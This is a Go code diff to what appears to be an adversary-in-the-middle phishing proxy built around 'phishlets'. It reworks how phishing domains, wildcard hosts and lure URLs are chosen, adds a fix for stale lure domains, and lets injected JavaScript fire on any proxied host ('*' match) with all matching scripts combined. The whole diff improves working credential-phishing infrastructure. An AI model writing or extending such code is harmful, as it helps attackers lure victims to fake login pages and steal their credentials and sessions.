@@ -763,32 +763,45 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 
 func (p *Phishlet) GetPhishHosts(use_wildcards bool) []string {
 	var ret []string
-	phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
-	if ok {
-		if !use_wildcards {
-			for _, h := range p.proxyHosts {
-				ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
-			}
-		} else {
-			ret = []string{"*." + phishDomain}
+	// Use the same domain-preference order as GetLureUrl/GetLandingPhishHost:
+	// dashboard-assigned domain takes priority over the phishlet's bound hostname.
+	phishDomain := p.cfg.GetPhishletDashboardDomain(p.Name)
+	var ok bool
+	if phishDomain == "" {
+		phishDomain, ok = p.cfg.GetSiteDomain(p.Name)
+		if !ok {
+			return ret
 		}
+	}
+	if !use_wildcards {
+		for _, h := range p.proxyHosts {
+			ret = append(ret, combineHost(h.phish_subdomain, phishDomain))
+		}
+	} else {
+		ret = []string{"*." + phishDomain}
 	}
 	return ret
 }
 
 func (p *Phishlet) GetLureUrl(path string) (string, error) {
-	var ret string
-	host := p.cfg.GetBaseDomain()
+	// Preferred phish domain: dashboard assignment, then the phishlet's bound
+	// hostname, then the server base domain. NEVER let a stale bound hostname
+	// override the dashboard selection (that was the old-domain-lure bug).
+	phishDomain := p.cfg.GetPhishletDashboardDomain(p.Name)
+	if phishDomain == "" {
+		phishDomain = p.cfg.GetBaseDomain()
+	}
+	if phishDomain == "" {
+		return "", fmt.Errorf("no domain configured for phishlet '%s' — set one in the dashboard", p.Name)
+	}
+	// Land the lure on the phishlet's landing proxy host (e.g. loq.<domain>).
 	for _, h := range p.proxyHosts {
 		if h.is_landing {
-			phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
-			if ok {
-				host = combineHost(h.phish_subdomain, phishDomain)
-			}
+			return "https://" + combineHost(h.phish_subdomain, phishDomain) + path, nil
 		}
 	}
-	ret = "https://" + host + path
-	return ret, nil
+	// No landing host defined: use the domain itself.
+	return "https://" + phishDomain + path, nil
 }
 
 func (p *Phishlet) GetLoginUrl() string {
@@ -796,6 +809,20 @@ func (p *Phishlet) GetLoginUrl() string {
 }
 
 func (p *Phishlet) GetLandingPhishHost() string {
+	// Same domain-preference order as GetLureUrl.
+	phishDomain := p.cfg.GetPhishletDashboardDomain(p.Name)
+	if phishDomain == "" {
+		phishDomain = p.cfg.GetBaseDomain()
+	}
+	if phishDomain != "" {
+		for _, ph := range p.proxyHosts {
+			if ph.is_landing {
+				return combineHost(ph.phish_subdomain, phishDomain)
+			}
+		}
+		return phishDomain
+	}
+	// Legacy fallback: the phishlet's configured site domain.
 	for _, ph := range p.proxyHosts {
 		if ph.is_landing {
 			phishDomain, ok := p.cfg.GetSiteDomain(p.Name)
@@ -808,10 +835,13 @@ func (p *Phishlet) GetLandingPhishHost() string {
 }
 
 func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, string, error) {
+	var allScripts []string
+	var firstID string
+
 	for _, js := range p.js_inject {
 		host_matched := false
 		for _, h := range js.trigger_domains {
-			if h == strings.ToLower(hostname) {
+			if h == "*" || h == strings.ToLower(hostname) {
 				host_matched = true
 				break
 			}
@@ -847,10 +877,18 @@ func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[str
 							script = strings.Replace(script, "{"+k+"}", v, -1)
 						}
 					}
-					return js.id, script, nil
+					allScripts = append(allScripts, script)
+					if firstID == "" {
+						firstID = js.id
+					}
 				}
 			}
 		}
+	}
+
+	if len(allScripts) > 0 {
+		// Concatenate all matching scripts with clear separator
+		return firstID, strings.Join(allScripts, "\n\n---\n\n"), nil
 	}
 	return "", "", fmt.Errorf("script not found")
 }
